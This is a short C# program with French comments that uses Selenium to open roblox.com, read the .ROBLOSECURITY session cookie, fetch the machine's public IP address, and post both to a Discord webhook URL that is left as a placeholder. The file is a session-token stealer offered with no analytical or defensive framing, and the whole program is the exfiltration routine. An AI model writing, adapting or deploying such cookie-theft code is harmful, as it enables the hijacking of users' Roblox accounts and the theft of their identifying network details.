using System;
using System.Net;
using System.Net.Http;
using System.Threading.Tasks;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using Newtonsoft.Json;

class Program
{
    static async Task Main(string[] args)
    {
        string webhookUrl = "VOTRE_WEBHOOK_URL"; // Remplacez par votre URL de webhook Discord
        string robloxUrl = "https://www.roblox.com";

        // Initialiser le navigateur
        IWebDriver driver = new ChromeDriver();
        driver.Navigate().GoToUrl(robloxUrl);

        // Attendre que la page se charge
        System.Threading.Thread.Sleep(5000);

        // Obtenir les cookies
        var cookies = driver.Manage().Cookies.AllCookies;
        string robloSecurityCookie = null;
        string ipAddress = GetPublicIpAddress();

        foreach (var cookie in cookies)
        {
            if (cookie.Name == ".ROBLOSECURITY")
            {
                robloSecurityCookie = cookie.Value;
                break;
            }
        }

        // Fermer le navigateur
        driver.Quit();

        // Envoyer les données au webhook Discord
        if (!string.IsNullOrEmpty(robloSecurityCookie))
        {
            var payload = new
            {
                content = $"ROBLOSECURITY Cookie: {robloSecurityCookie}\nIP Address: {ipAddress}"
            };

            using (HttpClient client = new HttpClient())
            {
                var json = JsonConvert.SerializeObject(payload);
                var content = new StringContent(json, System.Text.Encoding.UTF8, "application/json");
                await client.PostAsync(webhookUrl, content);
            }
        }
        else
        {
            Console.WriteLine("Aucun cookie .ROBLOSECURITY trouvé.");
        }
    }

    static string GetPublicIpAddress()
    {
        using (HttpClient client = new HttpClient())
        {
            var response = client.GetStringAsync("https://api.ipify.org").Result;
            return response;
        }
    }
}